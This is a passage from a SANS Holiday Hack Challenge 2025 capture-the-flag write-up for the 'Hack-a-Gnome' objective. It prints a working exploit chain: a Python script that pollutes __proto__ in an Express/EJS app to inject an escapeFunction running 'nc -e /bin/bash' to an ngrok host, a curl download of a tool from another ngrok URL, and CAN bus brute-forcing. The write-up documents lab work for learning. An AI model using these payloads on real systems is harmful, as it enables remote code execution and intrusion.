<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>SyntaxError: Unexpected token &#39; in JSON at position 0</code></pre></div>
<p>The stack trace references Express.js and EJS, indicating that user-supplied JSON is later rendered in an EJS template.</p>
<hr>
<h3 id="confirming-prototype-pollution">Confirming prototype pollution</h3>
<p>To test for prototype pollution, I submitted the following payload:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;action&#34;</span>:<span style="color:#e6db74">&#34;update&#34;</span>,<span style="color:#e6db74">&#34;key&#34;</span>:<span style="color:#e6db74">&#34;__proto__&#34;</span>,<span style="color:#e6db74">&#34;subkey&#34;</span>:<span style="color:#e6db74">&#34;toString&#34;</span>,<span style="color:#e6db74">&#34;value&#34;</span>:<span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">}</span></span></span></code></pre></div>
<p>After URL-encoding the payload and refreshing the page, the application began throwing global errors related to <code>Object.prototype</code>, confirming that <code>__proto__</code> pollution is possible.</p>
<hr>
<h3 id="weaponizing-the-vulnerability">Weaponizing the vulnerability</h3>
<p>At this point I switched to Python to automate the attack flow, as interacting via the browser became cumbersome.</p>
<p>The following script performs the complete exploitation chain:</p>
<ol>
<li>Logs in to the control panel</li>
<li>Triggers a JSON parsing error</li>
<li>Pollutes <code>__proto__</code> with required flags (<code>debug</code>, <code>client</code>)</li>
<li>Injects a malicious <code>escapeFunction</code></li>
<li>Triggers execution by loading <code>/stats</code></li>
</ol>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> html
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Login</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
</span></span><span style="display:flex;"><span>login_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/login?id=dfbd809f-8d6a-4500-87ba-c6e29b90f34c&#34;</span>
</span></span><span style="display:flex;"><span>creds <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;bruce&#34;</span>, <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;oatmeal12&#34;</span> }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(login_url, data<span style="color:#f92672">=</span>creds)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Trigger JSON parse error</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>error_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=&#39;&#34;</span>
</span></span><span style="display:flex;"><span>payload_r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(error_url)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>soup <span style="color:#f92672">=</span> BeautifulSoup(payload_r<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#34;html.parser&#34;</span>)
</span></span><span style="display:flex;"><span>raw_text <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>pre<span style="color:#f92672">.</span>get_text() 
</span></span><span style="display:flex;"><span>decoded_text <span style="color:#f92672">=</span> html<span style="color:#f92672">.</span>unescape(raw_text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(decoded_text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Staging</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> subkey <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#34;debug&#34;</span>, <span style="color:#e6db74">&#34;client&#34;</span>]:
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;action&#34;</span>: <span style="color:#e6db74">&#34;update&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;key&#34;</span>: <span style="color:#e6db74">&#34;__proto__&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;subkey&#34;</span>: subkey,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;value&#34;</span>: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload_encoded <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(json<span style="color:#f92672">.</span>dumps(payload))
</span></span><span style="display:flex;"><span>    proto_url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=</span><span style="color:#e6db74">{</span>payload_encoded<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>get(proto_url)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Weaponizing</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;action&#34;</span>: <span style="color:#e6db74">&#34;update&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;key&#34;</span>: <span style="color:#e6db74">&#34;__proto__&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;subkey&#34;</span>: <span style="color:#e6db74">&#34;escapeFunction&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;value&#34;</span>: <span style="color:#e6db74">&#34;JSON.stringify; process.mainModule.require(&#39;child_process&#39;).exec(&#39;nc -e /bin/bash 4.tcp.eu.ngrok.io 19342;sleep 10000000&#39;)&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload_encoded <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(json<span style="color:#f92672">.</span>dumps(payload))
</span></span><span style="display:flex;"><span>proto_url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=</span><span style="color:#e6db74">{</span>payload_encoded<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>get(proto_url)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Trigger execution</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>stats_panel_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats&#34;</span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>get(stats_panel_url)</span></span></code></pre></div>
<p>Note: The script outputs the various URLs for this to work. I simply had to copy and execute them in a browser in order to play the game. From here on the report reflects that.</p>
<hr>
<h3 id="operating-the-reverse-shell">Operating the reverse shell</h3>
<p>Once the payload was in place, it connected back through my infrastructure, resulting in an interactive shell:</p>
<p><a href="#R-image-4cf59d070d41be0ae21fe887035ac250" class="lightbox-link"><img alt="Call back" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-2.png" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-4cf59d070d41be0ae21fe887035ac250"><img alt="Call back" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-2.png"></a></p>
<p>While exploring the container, the <code>canbus_client.py</code> script stood out:</p>
<p><a href="#R-image-c09dfe95b7b466e85f4eb51a97cb28e3" class="lightbox-link"><img alt="Canbus client" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-3.png" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-c09dfe95b7b466e85f4eb51a97cb28e3"><img alt="Canbus client" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-3.png"></a></p>
<p>The script contains a <code>COMMAND_MAP</code>, but comments indicate the values are incorrect. The accompanying README confirms this:</p>
<p><a href="#R-image-e40435ccf15b2b3b861bc29662c61d95" class="lightbox-link"><img alt="Landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-4.png" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-e40435ccf15b2b3b861bc29662c61d95"><img alt="Landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-4.png"></a></p>
<hr>
<h3 id="enumerating-can-bus-control-codes">Enumerating CAN bus control codes</h3>
<p>To identify the correct movement commands, I modified the existing Python script into a brute-force CAN bus scanner and uploaded it to the container:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -o cb.py https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py</span></span></code></pre></div>
<p>The script was executed iteratively, narrowing the ID range based on observed robot movement. The final scan range was limited to <code>0x200â€“0x206</code>.</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> can
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>IFACE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;gcan0&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>RPM_LEFT_ID  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x310</span>
</span></span><span style="display:flex;"><span>RPM_RIGHT_ID <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x311</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SCAN_START <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x200</span>
</span></span><span style="display:flex;"><span>SCAN_END   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x206</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span></span></span></code></pre></div>
<hr>
<h3 id="final-control-mapping-and-solution">Final control mapping and solution</h3>
<p>After testing, I identified the following CAN bus mappings:</p>
<table>
  <thead>
      <tr>
          <th>Button</th>
          <th>Original ID</th>
          <th>Correct ID</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>w</td>
          <td>0x656</td>
          <td>0x201</td>
      </tr>
      <tr>
          <td>a</td>
          <td>0x658</td>
          <td>0x203</td>
      </tr>
      <tr>
          <td>s</td>
          <td>0x657</td>
          <td>0x202</td>
      </tr>
      <tr>
          <td>d</td>
          <td>0x659</td>
          <td>0x204</td>
      </tr>
  </tbody>
</table>
<p>After updating the script, I was able to navigate the robot through the maze and complete the objective:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>python3 cb.py &lt;direction&gt;</code></pre></div>
<p><a href="#R-image-c95346bd850a1d335cb9813bd30ece45" class="lightbox-link"><img alt="Final screen" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-5.png" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-c95346bd850a1d335cb9813bd30ece45"><img alt="Final screen" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-5.png"></a></p>
<h2 id="chris-davis-mission-debrief">Chris Davis mission debrief</h2>
<blockquote>
<p>Excellent work! You&rsquo;ve successfully taken control of the gnome - look at that interface responding to our commands now.</p>
<p>Time to turn this little rebel against its own manufacturing operation and shut them down for good!</p>
</blockquote>
<h2 id="hints">Hints</h2>
<p>For this objective I retrieved the followint hints:</p>
<table>
  <thead>
      <tr>
          <th>Hint</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Sometimes, client-side code can interfere with what you submit. Try proxying your requests through a tool like Burp Suite or OWASP ZAP. You might be able to trigger a revealing error message.</td>
      </tr>
      <tr>
          <td>I actually helped design the software that controls the factory back when we used it to make toys. It&rsquo;s quite complex. After logging in, there is a front-end that proxies requests to two main components: a backend Statistics page, which uses a per-gnome container to render a template with your gnome&rsquo;s stats, and the UI, which connects to the camera feed and sends control signals to the factory, relaying them to your gnome (assuming the CAN bus controls are hooked up correctly). Be careful, the gnomes shutdown if you logout and also shutdown if they run out of their 2-hour battery life (which means you&rsquo;d have to start all over again).</td>
      </tr>
      <tr>
          <td>There might be a way to check if an attribute IS_DEFINED on a given entry. This could allow you to brute-force possible attribute names for the target user&rsquo;s entry, which stores their password hash. Depending on the hash type, it might already be cracked and available online where you could find an online cracking station to break it.</td>
      </tr>
      <tr>
          <td>Once you determine the type of database the gnome control factory&rsquo;s login is using, look up its documentation on default document types and properties. This information could help you generate a list of common English first names to try in your attack.</td>
      </tr>
      <tr>
          <td>Oh no, it sounds like the CAN bus controls are not sending the correct signals! If only there was a way to hack into your gnome&rsquo;s control stats/signal container to get command-line access to the smart-gnome. This would allow you to fix the signals and control the bot to shut down the factory. During my development of the robotic prototype, we found the factory&rsquo;s pollution to be undesirable, which is why we shut it down. If not updated since then, the gnome might be running on old and outdated packages.</td>
      </tr>
      <tr>
          <td>Nice! Once you have command-line access to the gnome, you&rsquo;ll need to fix the signals in the canbus_client.py file so they match up correctly. After that, the signals you send through the web UI to the factory should properly control the smart-gnome. You could try sniffing CAN bus traffic, enumerating signals based on any documentation you find, or brute-forcing combinations until you discover the right signals to control the gnome from the web UI.</td>
      </tr>
  </tbody>
</table>
<h2 id="resources">Resources</h2>
<p>This objective required extensive reading up on the whole <code>__proto__</code> attack vector. We found these resources of great value for our research:</p>
<ul>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-EJS-2803307" rel="external">https://security.snyk.io/vuln/SNYK-JS-EJS-2803307</a></li>
<li><a href="https://blog.themikkel.dk/ddc-regionale-2025-writeup/" rel="external">https://blog.themikkel.dk/ddc-regionale-2025-writeup/</a></li>
<li><a href="https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/" rel="external">https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/</a></li>
<li><a href="https://www.nodejs-security.com/blog/understanding-and-preventing-prototype-pollution-in-nodejs" rel="external">https://www.nodejs-security.com/blog/understanding-and-preventing-prototype-pollution-in-nodejs</a></li>
<li><a href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce" rel="external">https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce</a></li>
<li><a href="https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325" rel="external">https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325</a></li>
<li><a href="https://medium.com/@albertoc_91016/prototype-pollution-in-open-source-libraries-exploiting-rce-in-ejs-ae93016630a3" rel="external">https://medium.com/@albertoc_91016/prototype-pollution-in-open-source-libraries-exploiting-rce-in-ejs-ae93016630a3</a></li>
<li><a href="https://ejs.co/#docs" rel="external">https://ejs.co/#docs</a></li>
</ul>

  <footer class="footline">
              <i class='fa-fw fas fa-calendar'></i> Dec 12, 2025
  </footer>
</article>
        </div>
      </main>
    </div>
    <aside id="R-sidebar" class="default-animation">
      <div id="R-header-topbar" class="default-animation"></div>
      <div id="R-header-wrapper" class="default-animation">
        <div id="R-header" class="default-animation">
          <a id="R-logo" class="R-default" href="/index.html">
            <div class="logo-title">SANS Holiday Hack Challenge 2025</div>
          </a>
        </div>
        <search><form action="/search/index.html" method="get">
          <div class="searchbox default-animation">
            <button class="search-detail" type="submit" title="Search (CTRL+ALT+f)"><i class="fas fa-search"></i></button>
            <label class="a11y-only" for="R-search-by">Search</label>
            <input data-search-input id="R-search-by" name="search-by" class="search-by" type="search" placeholder="Search...">
            <button class="search-clear" type="button" data-search-clear="" title="Clear search"><i class="fas fa-times" title="Clear search"></i></button>
          </div>
        </form></search>
      </div>
      <div id="R-homelinks" class="default-animation homelinks">
        <div class="R-menu-divider default-animation">
          <hr class="padding">
        </div>
        <div class="R-sidebarmenu R-shortcutmenu-homelinks">
          <ul class="space collapsible-menu">
            <li class="" data-nav-url="/index.html"><a class="padding" href="/index.html"><i class="fa-fw fas fa-home"></i> Home</a></li>
          </ul>
        </div>
        <div class="R-menu-divider default-animation">
          <hr class="padding">
        </div>
        <div class="R-sidebarmenu R-shortcutmenu-headercontrols">
          <ul class="">
          </ul>
        </div>
        <div class="R-menu-divider default-animation">
          <hr class="padding">
        </div>
      </div>
      <div id="R-content-wrapper" class="highlightable">
        <div class="R-sidebarmenu R-shortcutmenu-main">
          <ul class="enlarge morespace collapsible-menu">
            <li class="" data-nav-url="/act1/index.html"><a class="padding" href="/act1/index.html">Act 1</a><ul id="R-subsections-8dc0c36ceefa45529ff4cf1f9bdc1f66" class="collapsible-menu"></ul></li>
            <li class="" data-nav-url="/act2/index.html"><a class="padding" href="/act2/index.html">Act 2</a><ul id="R-subsections-9d3d8c898368693a495088de36411fa6" class="collapsible-menu"></ul></li>
            <li class="parent " data-nav-url="/act3/index.html"><a class="padding" href="/act3/index.html">Act 3</a><ul id="R-subsections-0b6215c9fad834351813cc2ad0d4a335" class="collapsible-menu">
            <li class="" data-nav-url="/act3/gnome-tea/index.html"><a class="padding" href="/act3/gnome-tea/index.html">Gnome Tea</a></li>
            <li class="active " data-nav-url="/act3/hack-a-gnome/index.html"><a class="padding" href="/act3/hack-a-gnome/index.html">Hack-a-Gnome</a></li>
            <li class="" data-nav-url="/act3/snowcat-rce-and-priv-esc/index.html"><a class="padding" href="/act3/snowcat-rce-and-priv-esc/index.html">Snowcat RCE &amp; Priv Esc</a></li>
            <li class="" data-nav-url="/act3/schrodingers-scope/index.html"><a class="padding" href="/act3/schrodingers-scope/index.html">SchrÃ¶dingers Scope</a></li>
            <li class="" data-nav-url="/act3/find-and-shutdown-frostys-snowglobe-machine/index.html"><a class="padding" href="/act3/find-and-shutdown-frostys-snowglobe-machine/index.html">Find and Shutdown Frostys Snowglobe Machine</a></li>
            <li class="" data-nav-url="/act3/on-the-wire/index.html"><a class="padding" href="/act3/on-the-wire/index.html">On the Wire</a></li>
            <li class="" data-nav-url="/act3/free-ski/index.html"><a class="padding" href="/act3/free-ski/index.html">Free Ski</a></li></ul></li>
          </ul>
        </div>
        <div class="R-sidebarmenu R-shortcutmenu-shortcuts">
          <ul class="space collapsible-menu">
          </ul>
        </div>
        <div id="R-footer-margin"></div>
        <div class="R-menu-divider default-animation">
          <hr class="padding">
        </div>
        <div class="R-sidebarmenu R-shortcutmenu-footercontrols">
          <ul class="">
          </ul>
        </div>
<div id="R-footer"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
      </div>
    </aside>
    <script src="/js/clipboard/clipboard.min.js?1765552249" defer></script>
    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1765552249" defer></script>
    <script src="/js/theme.js?1765552249" defer></script>
  </body>
</html>
